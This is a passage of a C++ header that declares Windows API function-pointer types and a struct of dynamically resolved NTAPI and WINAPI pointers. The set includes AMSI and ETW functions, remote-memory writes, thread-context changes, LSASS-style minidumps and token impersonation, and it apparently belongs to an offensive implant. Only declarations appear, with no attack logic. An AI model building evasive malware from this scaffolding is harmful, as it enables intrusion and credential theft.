    typedef BOOL (WINAPI* LPPROC_CRYPTBINARYTOSTRINGW)(const BYTE *pbBinary, DWORD cbBinary, DWORD dwFlags, LPWSTR pszString, DWORD *pcchString);
    // CryptStringToBinaryW
    typedef BOOL (WINAPI* LPPROC_CRYPTSTRINGTOBINARYW)(LPCWSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
    // DeleteFileW
    typedef BOOL (WINAPI* LPPROC_DELETEFILEW)(LPCTSTR lpFileName);
    // DispatchMessage
    typedef LRESULT (WINAPI* LPPROC_DISPATCHMESSAGE)(const MSG *lpMsg);
    // DllMain
    typedef BOOL (WINAPI* LPPROC_DLLMAIN)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
    // DuplicateTokenEx
    typedef BOOL (WINAPI* LPPROC_DUPLICATETOKENEX)(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);
    // ExpandEnvironmentStringsW
    typedef DWORD (WINAPI* LPPROC_EXPANDENVIRONMENTSTRINGSW)(LPCWSTR lpSrc, LPWSTR lpDst, DWORD nSize);
    // FindClose
    typedef BOOL (WINAPI* LPPROC_FINDCLOSE)(HANDLE hFindFile);
    // FindFirstFileW
    typedef HANDLE (WINAPI* LPPROC_FINDFIRSTFILEW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
    // FindNextFileW
    typedef BOOL (WINAPI* LPPROC_FINDNEXTFILEW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
    // FormatMessage
    typedef DWORD (WINAPI* LPPROC_FORMATMESSAGE)(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPTSTR lpBuffer, DWORD nSize, va_list *Arguments);
    // FreeEnvironmentStringsW
    typedef BOOL (WINAPI* LPPROC_FREEENVIRONMENTSTRINGSW)(LPWCH penv);
    // FreeLibrary
    typedef BOOL (WINAPI* LPPROC_FREELIBRARY)(HMODULE hLibModule);
    // GetAdaptersAddresses
    typedef ULONG (WINAPI* LPPROC_GETADAPTERSADDRESSES)(ULONG Family, ULONG Flags, PVOID Reserved, Win32::PIP_ADAPTER_ADDRESSES AdapterAddresses, PULONG SizePointer);
    // GetComputerNameW
    typedef BOOL (WINAPI* LPPROC_GETCOMPUTERNAMEW)(LPWSTR lpBuffer, LPDWORD nSize);
    // GetComputerNameExW
    typedef BOOL (WINAPI* LPPROC_GETCOMPUTERNAMEEXW)(COMPUTER_NAME_FORMAT NameType, LPWSTR lpBuffer, LPDWORD nSize);
    // GetEnvironmentStringsW
    typedef LPWCH (WINAPI* LPPROC_GETENVIRONMENTSTRINGSW)();
    // GetExitCodeProcess
    typedef BOOL (WINAPI* LPPROC_GETEXITCODEPROCESS)(HANDLE hProcess, LPDWORD lpExitCode);
    // GetForegroundWindow
    typedef HWND (WINAPI* LPPROC_GETFOREGROUNDWINDOW)();
    // GetLastError
    typedef DWORD (WINAPI* LPPROC_GETLASTERROR)();
    // GetLocalTime
    typedef VOID (WINAPI* LPPROC_GETLOCALTIME)(LPSYSTEMTIME lpSystemTime);
    // GetMessage
    typedef BOOL (WINAPI* LPPROC_GETMESSAGE)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
    // GetModuleFileNameW
    typedef DWORD (WINAPI* LPPROC_GETMODULEFILENAMEW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
    // GetModuleHandleA
    typedef HMODULE (WINAPI* LPPROC_GETMODULEHANDLEA)(LPCSTR lpModuleName);
    // GetProcAddress
    typedef FARPROC (WINAPI* LPPROC_GETPROCADDRESS)(HMODULE hModule, LPCSTR lpProcName);
    // GetProcessHeap
    typedef HANDLE (WINAPI* LPPROC_GETPROCESSHEAP)();
    // GetProcssImageFileNameW
    typedef DWORD (WINAPI* LPPROC_GETPROCESSIMAGEFILENAMEW)(HANDLE hProcess, LPWSTR lpImageFileName, DWORD nSize);
    // GetSystemDirectoryW
    typedef UINT (WINAPI* LPPROC_GETSYSTEMDIRECTORYW)(LPWSTR lpBuffer, UINT uSize);
    // GetSystemInfo
    typedef VOID (WINAPI* LPPROC_GETSYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
    // GetSystemMetrics
    typedef int (WINAPI* LPPROC_GETSYSTEMMETRICS)(int nIndex);
    // GetSystemTime
    typedef VOID (WINAPI* LPPROC_GETSYSTEMTIME)(LPSYSTEMTIME lpSystemTime);
    // GetTcpTable
    typedef ULONG (WINAPI* LPPROC_GETTCPTABLE)(Win32::PMIB_TCPTABLE TcpTable, PULONG SizePointer, BOOL Order);
    // GetTickCount
    typedef DWORD (WINAPI* LPPROC_GETTICKCOUNT)();
    // GetTokenInformation
    typedef BOOL (WINAPI* LPPROC_GETTOKENINFORMATION)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
    // GetUserNameW
    typedef BOOL (WINAPI* LPPROC_GETUSERNAMEW)(LPWSTR lpBuffer, LPDWORD pcbBuffer);
    // GetVersionExW
    typedef BOOL (WINAPI* LPPROC_GETVERSIONEXW)(LPOSVERSIONINFOEXW lpVersionInformation);
    // GlobalAlloc
    typedef HGLOBAL (WINAPI* LPPROC_GLOBALALLOC)(UINT uFlags, SIZE_T dwBytes);
    // GlobalFree
    typedef HGLOBAL (WINAPI* LPPROC_GLOBALFREE)(HGLOBAL hMem);
    // HeapAlloc
    typedef LPVOID (WINAPI* LPPROC_HEAPALLOC)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
    // HeapFree
    typedef BOOL (WINAPI* LPPROC_HEAPFREE)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
    // ImpersonateLoggedOnUser
    typedef BOOL (WINAPI* LPPROC_IMPERSONATELOGGEDONUSER)(HANDLE hToken);
    // IsDebuggerPresent
    typedef BOOL (WINAPI* LPPROC_ISDEBUGGERPRESENT)();
    // LoadAcceleratorsW
    typedef HACCEL (WINAPI* LPPROC_LOADACCELERATORSW)(HINSTANCE hInstance, LPCWSTR lpTableName);
    // LoadCursorW
    typedef HCURSOR (WINAPI* LPPROC_LOADCURSORW)(HINSTANCE hInstance, LPCWSTR lpCursorName);
    // LoadIconW
    typedef HICON (WINAPI* LPPROC_LOADICONW)(HINSTANCE hInstance, LPCWSTR lpIconName);
    // LoadLibraryA
    typedef HMODULE (WINAPI* LPPROC_LOADLIBRARYA)(LPCSTR lpLibFileName);
    // LoadLibraryW
    typedef HMODULE (WINAPI* LPPROC_LOADLIBRARYW)(LPCWSTR lpLibFileName);
    // LocalAlloc
    typedef HLOCAL (WINAPI* LPPROC_LOCALALLOC)(UINT uFlags, SIZE_T uBytes);
    // LocalFree
    typedef HLOCAL (WINAPI* LPPROC_LOCALFREE)(HLOCAL hMem);
    // LookupPrivilegeNameW
    typedef BOOL (WINAPI* LPPROC_LOOKUPPRIVILEGENAMEW)(LPCWSTR lpSystemName, PLUID lpLuid, LPWSTR lpName, LPDWORD cchName);
    // LookupPrivilegeValueW
    typedef BOOL (WINAPI* LPPROC_LOOKUPPRIVILEGEVALUEW)(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
    // MessageBoxA
    typedef int (WINAPI* LPPROC_MESSAGEBOXA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
    // MessageBoxW
    typedef int (WINAPI* LPPROC_MESSAGEBOXW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
    // MiniDumpWriteDump
    typedef BOOL (WINAPI* LPPROC_MINIDUMPWRITEDUMP)(HANDLE hProcess, DWORD ProcessId, HANDLE hFile, MINIDUMP_TYPE DumpType, PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam, PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, PMINIDUMP_CALLBACK_INFORMATION CallbackParam);
    // MoveFileW
    typedef BOOL (WINAPI* LPPROC_MOVEFILEW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName);
    // NetApiBufferFree
    typedef Win32::NET_API_STATUS (WINAPI* LPPROC_NETAPIBUFFERFREE)(LPVOID Buffer);
    // NetLocalGroupEnum
    typedef Win32::NET_API_STATUS (WINAPI* LPPROC_NETLOCALGROUPENUM)(LPCWSTR servername, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, PDWORD_PTR resumehandle);
    // NetUserAdd
    typedef Win32::NET_API_STATUS (WINAPI* LPPROC_NETUSERADD)(LPCWSTR servername, DWORD level, LPBYTE buf, LPDWORD parm_err);
    // NetUserDel
    typedef Win32::NET_API_STATUS (WINAPI* LPPROC_NETUSERDEL)(LPCWSTR servername, LPCWSTR username);
    // NetUserEnum
    typedef Win32::NET_API_STATUS (WINAPI* LPPROC_NETUSERENUM)(LPCWSTR servername, DWORD level, DWORD filter, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, PDWORD resume_handle);
    // OpenProcess
    typedef HANDLE (WINAPI* LPPROC_OPENPROCESS)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
    // OpenProcessToken
    typedef BOOL (WINAPI* LPPROC_OPENPROCESSTOKEN)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
    // PrivilegeCheck
    typedef BOOL (WINAPI* LPPROC_PRIVILEGECHECK)(HANDLE ClientToken, PPRIVILEGE_SET RequiredPrivileges, LPBOOL pfResult);
    // QueryFullProcessImageNameW
    typedef BOOL (WINAPI* LPPROC_QUERYFULLPROCESSIMAGENAMEW)(HANDLE hProcess, DWORD  dwFlags, LPWSTR lpExeName, PDWORD lpdwSize);
    // ReadFile
    typedef BOOL (WINAPI* LPPROC_READFILE)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
    // ReadProcessMemory
    typedef BOOL (WINAPI* LPPROC_READPROCESSMEMORY)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
    // RegCloseKey
    typedef LSTATUS (WINAPI* LPPROC_REGCLOSEKEY)(HKEY hKey);
    // RegCreateKeyExW
    typedef LSTATUS (WINAPI* LPPROC_REGCREATEKEYEXW)(HKEY hKey, LPCWSTR lpSubKey, DWORD Reserved, LPWSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
    // RegEnumKeyExW
    typedef LSTATUS (WINAPI* LPPROC_REGENUMKEYEXW)(HKEY hKey, DWORD dwIndex, LPWSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved, LPWSTR lpClass, LPDWORD lpcchClass, PFILETIME lpftLastWriteTime);
    // RegEnumValueW
    typedef LSTATUS (WINAPI* LPPROC_REGENUMVALUEW)(HKEY hKey, DWORD dwIndex, LPWSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
    // RegisterClassExW
    typedef ATOM (WINAPI* LPPROC_REGISTERCLASSEXW)(const WNDCLASSEXW *unnamedParam1);
    // RegOpenKeyExW
    typedef LSTATUS (WINAPI* LPPROC_REGOPENKEYEXW)(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
    // RegQueryInforKeyW
    typedef LSTATUS (WINAPI* LPPROC_REGQUERYINFOKEYW)(HKEY hKey, LPWSTR lpClass, LPDWORD lpcchClass, LPDWORD lpReserved, LPDWORD lpcSubKeys, LPDWORD lpcbMaxSubKeyLen, LPDWORD lpcbMaxClassLen, LPDWORD lpcValues, LPDWORD lpcbMaxValueNameLen, LPDWORD lpcbMaxValueLen, LPDWORD lpcbSecurityDescriptor, PFILETIME lpftLastWriteTime);
    // RegSaveKeyW
    typedef LSTATUS (WINAPI* LPPROC_REGSAVEKEYW)(HKEY hKey, LPCWSTR lpFile, const LPSECURITY_ATTRIBUTES lpSecurityAttributes);
    // RegSetValueExW
    typedef LSTATUS (WINAPI* LPPROC_REGSETVALUEEXW)(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
    // RemoveDirectoryW
    typedef BOOL (WINAPI* LPPROC_REMOVEDIRECTORYW)(LPCWSTR lpPathName);
    // RevertToSelf
    typedef BOOL (WINAPI* LPPROC_REVERTTOSELF)();
    // RtlAddFunctionTable
    typedef BOOL (WINAPI* LPPROC_RTLADDFUNCTIONTABLE)(PRUNTIME_FUNCTION FunctionTable, DWORD EntryCount, DWORD64 BaseAddress);
    // RtlCopyMemory
    typedef VOID (WINAPI* LPPROC_RTLCOPYMEMORY)(void* Destination, const void* Source, size_t Length);
    // SetFileInformationByHandle
    typedef BOOL (WINAPI* LPPROC_SETFILEINFORMATIONBYHANDLE)(HANDLE hFile, Nt::FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID lpFileInformation, DWORD dwBufferSize);
    // SetHandleInformation
    typedef BOOL (WINAPI* LPPROC_SETHANDLEINFORMATION)(HANDLE hObject, DWORD dwMask, DWORD dwFlags);
    // SetThreadContext
    typedef BOOL (WINAPI* LPPROC_SETTHREADCONTEXT)(HANDLE hThread, const CONTEXT *lpContext);
    // ShellExecuteExW
    typedef BOOL (WINAPI* LPPROC_SHELLEXECUTEEXW)(SHELLEXECUTEINFOW *pExecInfo);
    // ShowWindow
    typedef BOOL (WINAPI* LPPROC_SHOWWINDOW)(HWND hWnd, int nCmdShow);
    // SystemTimeToFileTime
    typedef BOOL (WINAPI* LPPROC_SYSTEMTIMETOFILETIME)(const SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime);
    // TerminateProcess
    typedef BOOL (WINAPI* LPPROC_TERMINATEPROCESS)(HANDLE hProcess, UINT uExitCode);
    // TranslateAcceleratorW
    typedef int (WINAPI* LPPROC_TRANSLATEACCELERATORW)(HWND hWnd, HACCEL hAccTable, LPMSG lpMsg);
    // TranslateMessage
    typedef BOOL (WINAPI* LPPROC_TRANSLATEMESSAGE)(const MSG *lpMsg);
    // UpdateWindow
    typedef BOOL (WINAPI* LPPROC_UPDATEWINDOW)(HWND hWnd);
    // VirtualAlloc
    typedef LPVOID (WINAPI* LPPROC_VIRTUALALLOC)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    // VirtualAllocEx
    typedef LPVOID (WINAPI* LPPROC_VIRTUALALLOCEX)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    // VirtualFree
    typedef BOOL (WINAPI* LPPROC_VIRTUALFREE)(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
    // VirtualProtect
    typedef BOOL (WINAPI* LPPROC_VIRTUALPROTECT)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    // VirtualProtectEx
    typedef BOOL (WINAPI* LPPROC_VIRTUALPROTECTEX)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    // WinHttpCloseHandle
    typedef BOOL (WINAPI* LPPROC_WINHTTPCLOSEHANDLE)(HINTERNET hInternet);
    // WinHttpConnect
    typedef HINTERNET (WINAPI* LPPROC_WINHTTPCONNECT)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
    // WinHttpOpen
    typedef HINTERNET (WINAPI* LPPROC_WINHTTPOPEN)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
    // WinHttpOpenRequest
    typedef HINTERNET (WINAPI* LPPROC_WINHTTPOPENREQUEST)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags);
    // WinHttpQueryDataAvailable
    typedef BOOL (WINAPI* LPPROC_WINHTTPQUERYDATAAVAILABLE)(HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
    // winHttpQueryHeaders
    typedef BOOL (WINAPI* LPPROC_WINHTTPQUERYHEADERS)(HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
    // WinHttpReadData
    typedef BOOL (WINAPI* LPPROC_WINHTTPREADDATA)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesLength, LPDWORD lpdwNumberOfBytesRead);
    // WinHttpReceiveResponse
    typedef BOOL (WINAPI* LPPROC_WINHTTPRECEIVERESPONSE)(HINTERNET hRequest, LPVOID lpReserved);
    // WinHttpSendRequest
    typedef BOOL (WINAPI* LPPROC_WINHTTPSENDREQUEST)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
    // WinHttpSetOption
    typedef BOOL (WINAPI* LPPROC_WINHTTPSETOPTION)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
    // WinHttpWriteData
    typedef BOOL (WINAPI* LPPROC_WINHTTPWRITEDATA)(HINTERNET hRequest, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten);
    // WriteProcessMemory
    typedef BOOL (WINAPI* LPPROC_WRITEPROCESSMEMORY)(HANDLE  hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
    // WSACleanup
    typedef int (WINAPI* LPPROC_WSACLEANUP)();
    // WSAStartup
    typedef int (WINAPI* LPPROC_WSASTARTUP)(WORD wVersionRequired, LPWSADATA lpWSAData);

    struct PROCS
    {
        // **NTAPI**
        LPPROC_ETWEVENTWRITE                lpEtwEventWrite                     = nullptr;
        LPPROC_LDRLOADDLL                   lpLdrLoadDll                        = nullptr;
        LPPROC_NTADJUSTPRIVILEGESTOKEN      lpNtAdjustPrivilegesToken           = nullptr;
        LPPROC_NTALLOCATEVIRTUALMEMORY      lpNtAllocateVirtualMemory           = nullptr;
        LPPROC_NTCLOSE                      lpNtClose                           = nullptr;
        LPPROC_NTCREATEFILE                 lpNtCreateFile                      = nullptr;
        LPPROC_NTCREATENAMEDPIPEFILE        lpNtCreateNamedPipeFile             = nullptr;
        LPPROC_NTCREATEPROCESSEX            lpNtCreateProcessEx                 = nullptr;
        LPPROC_NTCREATETHREADEX             lpNtCreateThreadEx                  = nullptr;
        LPPROC_NTDELETEFILE                 lpNtDeleteFile                      = nullptr;
        LPPROC_NTDUPLICATEOBJECT            lpNtDuplicateObject                 = nullptr;
        LPPROC_NTENUMERATEVALUEKEY          lpNtEnumerateValueKey               = nullptr;
        LPPROC_NTFLUSHINSTRUCTIONCACHE      lpNtFlushInstructionCache           = nullptr;
        LPPROC_NTFREEVIRTUALMEMORY          lpNtFreeVirtualMemory               = nullptr;
        LPPROC_NTGETCONTEXTTHREAD           lpNtGetContextThread                = nullptr;
        LPPROC_NTOPENFILE                   lpNtOpenFile                        = nullptr;
        LPPROC_NTOPENKEYEX                  lpNtOpenKeyEx                       = nullptr;
        LPPROC_NTOPENPROCESS                lpNtOpenProcess                     = nullptr;
        LPPROC_NTOPENPROCESSTOKEN           lpNtOpenProcessToken                = nullptr;
        LPPROC_NTPRIVILEGECHECK             lpNtPrivilegeCheck                  = nullptr;
        LPPROC_NTPROTECTVIRTUALMEMORY       lpNtProtectVirtualMemory            = nullptr;
        LPPROC_NTQUERYINFORMATIONFILE       lpNtQueryInformationFile            = nullptr;
        LPPROC_NTQUERYINFORMATIONPROCESS    lpNtQueryInformationProcess         = nullptr;
        LPPROC_NTQUERYINFORMATIONTOKEN      lpNtQueryInformationToken           = nullptr;
        LPPROC_NTQUERYKEY                   lpNtQueryKey                        = nullptr;
        LPPROC_NTQUERYSYSTEMINFORMATION     lpNtQuerySystemInformation          = nullptr;
        LPPROC_NTREADFILE                   lpNtReadFile                        = nullptr;
        LPPROC_NTREADVIRTUALMEMORY          lpNtReadVirtualMemory               = nullptr;
        LPPROC_NTRESUMETHREAD               lpNtResumeThread                    = nullptr;
        LPPROC_NTSETCONTEXTTHREAD           lpNtSetContextThread                = nullptr;
        LPPROC_NTSETINFORMATIONFILE         lpNtSetInformationFile              = nullptr;
        LPPROC_NTSETINFORMATIONPROCESS      lpNtSetInformationProcess           = nullptr;
        LPPROC_NTSYSTEMDEBUGCONTROL         lpNtSystemDebugControl              = nullptr;
        LPPROC_NTTERMINATEPROCESS           lpNtTerminateProcess                = nullptr;
        LPPROC_NTTRACEEVENT                 lpNtTraceEvent                      = nullptr;
        LPPROC_NTUNMAPVIEWOFSECTION         lpNtUnmapViewOfSection              = nullptr;
        LPPROC_NTWAITFORSINGLEOBJECT        lpNtWaitForSingleObject             = nullptr;
        LPPROC_NTWRITEFILE                  lpNtWriteFile                       = nullptr;
        LPPROC_NTWRITEVIRTUALMEMORY         lpNtWriteVirtualMemory              = nullptr;
        LPPROC_RTLALLOCATEHEAP              lpRtlAllocateHeap                   = nullptr;
        LPPROC_RTLEXPANDENVIRONMENTSTRINGS  lpRtlExpandEnvironmentStrings       = nullptr;
        LPPROC_RTLGETCURRENTDIRECTORY_U     lpRtlGetCurrentDirectory_U          = nullptr;
        LPPROC_RTLGETFULLPATHNAME_U         lpRtlGetFullPathName_U              = nullptr;
        LPPROC_RTLINITUNICODESTRING         lpRtlInitUnicodeString              = nullptr;
        LPPROC_RTLQUERYSYSTEMINFORMATION    lpRtlQuerySystemInformation         = nullptr;
        LPPROC_RTLSETCURRENTDIRECTORY_U     lpRtlSetCurrentDirectory_U          = nullptr;
        LPPROC_RTLSTRINGCCHCATW             lpRtlStringCchCatW                  = nullptr;
        LPPROC_RTLSTRINGCCHCOPYW            lpRtlStringCchCopyW                 = nullptr;
        LPPROC_RTLSTRINGCCHLENGTHW          lpRtlStringCchLengthW               = nullptr;
        LPPROC_RTLZEROMEMORY                lpRtlZeroMemory                     = nullptr;

        // **WINAPI**
        LPPROC_ADJUSTTOKENPRIVILEGES        lpAdjustTokenPrivileges             = nullptr;
        LPPROC_AMSISCANBUFFER               lpAmsiScanBuffer                    = nullptr;
        LPPROC_BCRYPTCLOSEALGORITHMPROVIDER lpBCryptCloseAlgorithmProvider      = nullptr;
        LPPROC_BCRYPTDECRYPT                lpBCryptDecrypt                     = nullptr;
        LPPROC_BCRYPTDESTROYKEY             lpBCryptDestroyKey                  = nullptr;
        LPPROC_BCRYPTENCRYPT                lpBCryptEncrypt                     = nullptr;
        LPPROC_BCRYPTGENERATESYMMETRICKEY   lpBCryptGenerateSymmetricKey        = nullptr;
        LPPROC_BCRYPTGETPROPERTY            lpBCryptGetProperty                 = nullptr;
        LPPROC_BCRYPTOPENALGORITHMPROVIDER  lpBCryptOpenAlgorithmProvider       = nullptr;
        LPPROC_BCRYPTSETPROPERTY            lpBCryptSetProperty                 = nullptr;
        LPPROC_CHECKREMOTEDEBUGGERPRESENT   lpCheckRemoteDebuggerPresent        = nullptr;
        LPPROC_CLOSEHANDLE                  lpCloseHandle                       = nullptr;
        LPPROC_CREATEFILEW                  lpCreateFileW                       = nullptr;
        LPPROC_CREATEPIPE                   lpCreatePipe                        = nullptr;
        LPPROC_CREATEPROCESSW               lpCreateProcessW                    = nullptr;
        LPPROC_CREATEPROCESSWITHLOGONW      lpCreateProcessWithLogonW           = nullptr;
        LPPROC_CREATEPROCESSWITHTOKENW      lpCreateProcessWithTokenW           = nullptr;
        LPPROC_CREATEREMOTETHREADEX         lpCreateRemoteThreadEx              = nullptr;
        LPPROC_CREATEWINDOWEXW              lpCreateWindowExW                   = nullptr;
        LPPROC_CRYPTBINARYTOSTRINGW         lpCryptBinaryToStringW              = nullptr;
        LPPROC_CRYPTSTRINGTOBINARYW         lpCryptStringToBinaryW              = nullptr;
        LPPROC_DELETEFILEW                  lpDeleteFileW                       = nullptr;
        LPPROC_DISPATCHMESSAGE              lpDispatchMessage                   = nullptr;
        LPPROC_DUPLICATETOKENEX             lpDuplicateTokenEx                  = nullptr;
        LPPROC_EXPANDENVIRONMENTSTRINGSW    lpExpandEnvironmentStringsW         = nullptr;
        LPPROC_FINDCLOSE                    lpFindClose                         = nullptr;
        LPPROC_FINDFIRSTFILEW               lpFindFirstFileW                    = nullptr;
        LPPROC_FINDNEXTFILEW                lpFindNextFileW                     = nullptr;
        LPPROC_FORMATMESSAGE                lpFormatMessage                     = nullptr;
        LPPROC_FREEENVIRONMENTSTRINGSW      lpFreeEnvironmentStringsW           = nullptr;
        LPPROC_FREELIBRARY                  lpFreeLibrary                       = nullptr;
        LPPROC_GETADAPTERSADDRESSES         lpGetAdaptersAddresses              = nullptr;
        LPPROC_GETCOMPUTERNAMEW             lpGetComputerNameW                  = nullptr;
        LPPROC_GETCOMPUTERNAMEEXW           lpGetComputerNameExW                = nullptr;
        LPPROC_GETENVIRONMENTSTRINGSW       lpGetEnvironmentStringsW            = nullptr;
        LPPROC_GETEXITCODEPROCESS           lpGetExitCodeProcess                = nullptr;
        LPPROC_GETFOREGROUNDWINDOW          lpGetForegroundWindow               = nullptr;
        LPPROC_GETLASTERROR                 lpGetLastError                      = nullptr;
        LPPROC_GETLOCALTIME                 lpGetLocalTime                      = nullptr;
        LPPROC_GETMESSAGE                   lpGetMessage                        = nullptr;
        LPPROC_GETMODULEFILENAMEW           lpGetModuleFileNameW                = nullptr;
        LPPROC_GETMODULEHANDLEA             lpGetModuleHandleA                  = nullptr;
        LPPROC_GETPROCADDRESS               lpGetProcAddress                    = nullptr;
        LPPROC_GETPROCESSHEAP               lpGetProcessHeap                    = nullptr;
        LPPROC_GETPROCESSIMAGEFILENAMEW     lpGetProcessImageFileNameW          = nullptr;
        LPPROC_GETSYSTEMDIRECTORYW          lpGetSystemDirectoryW               = nullptr;
        LPPROC_GETSYSTEMINFO                lpGetSystemInfo                     = nullptr;
        LPPROC_GETSYSTEMMETRICS             lpGetSystemMetrics                  = nullptr;
        LPPROC_GETSYSTEMTIME                lpGetSystemTime                     = nullptr;
        LPPROC_GETTCPTABLE                  lpGetTcpTable                       = nullptr;
        LPPROC_GETTICKCOUNT                 lpGetTickCount                      = nullptr;
        LPPROC_GETTOKENINFORMATION          lpGetTokenInformation               = nullptr;
        LPPROC_GETUSERNAMEW                 lpGetUserNameW                      = nullptr;
        LPPROC_GETVERSIONEXW                lpGetVersionExW                     = nullptr;
        LPPROC_GLOBALALLOC                  lpGlobalAlloc                       = nullptr;
        LPPROC_GLOBALFREE                   lpGlobalFree                        = nullptr;
        LPPROC_HEAPALLOC                    lpHeapAlloc                         = nullptr;
        LPPROC_HEAPFREE                     lpHeapFree                          = nullptr;
        LPPROC_IMPERSONATELOGGEDONUSER      lpImpersonateLoggedOnUser           = nullptr;
        LPPROC_ISDEBUGGERPRESENT            lpIsDebuggerPresent                 = nullptr;
        LPPROC_LOADACCELERATORSW            lpLoadAcceleratorsW                 = nullptr;
        LPPROC_LOADCURSORW                  lpLoadCursorW                       = nullptr;
        LPPROC_LOADICONW                    lpLoadIconW                         = nullptr;
        LPPROC_LOADLIBRARYA                 lpLoadLibraryA                      = nullptr;
        LPPROC_LOADLIBRARYW                 lpLoadLibraryW                      = nullptr;
        LPPROC_LOCALALLOC                   lpLocalAlloc                        = nullptr;
        LPPROC_LOCALFREE                    lpLocalFree                         = nullptr;
        LPPROC_LOOKUPPRIVILEGENAMEW         lpLookupPrivilegeNameW              = nullptr;
        LPPROC_LOOKUPPRIVILEGEVALUEW        lpLookupPrivilegeValueW             = nullptr;
        LPPROC_MINIDUMPWRITEDUMP            lpMiniDumpWriteDump                 = nullptr;
        LPPROC_MOVEFILEW                    lpMoveFileW                         = nullptr;
        LPPROC_NETAPIBUFFERFREE             lpNetApiBufferFree                  = nullptr;
        LPPROC_NETLOCALGROUPENUM            lpNetLocalGroupEnum                 = nullptr;
        LPPROC_NETUSERADD                   lpNetUserAdd                        = nullptr;
        LPPROC_NETUSERDEL                   lpNetUserDel                        = nullptr;
        LPPROC_NETUSERENUM                  lpNetUserEnum                       = nullptr;
        LPPROC_OPENPROCESS                  lpOpenProcess                       = nullptr;
        LPPROC_OPENPROCESSTOKEN             lpOpenProcessToken                  = nullptr;
        LPPROC_PRIVILEGECHECK               lpPrivilegeCheck                    = nullptr;
        LPPROC_QUERYFULLPROCESSIMAGENAMEW   lpQueryFullProcessImageNameW        = nullptr;
        LPPROC_READFILE                     lpReadFile                          = nullptr;
        LPPROC_READPROCESSMEMORY            lpReadProcessMemory                 = nullptr;
        LPPROC_REGCLOSEKEY                  lpRegCloseKey                       = nullptr;
        LPPROC_REGCREATEKEYEXW              lpRegCreateKeyExW                   = nullptr;
        LPPROC_REGENUMKEYEXW                lpRegEnumKeyExW                     = nullptr;
        LPPROC_REGENUMVALUEW                lpRegEnumValueW                     = nullptr;
        LPPROC_REGISTERCLASSEXW             lpRegisterClassExW                  = nullptr;
        LPPROC_REGOPENKEYEXW                lpRegOpenKeyExW                     = nullptr;
        LPPROC_REGQUERYINFOKEYW             lpRegQueryInfoKeyW                  = nullptr;
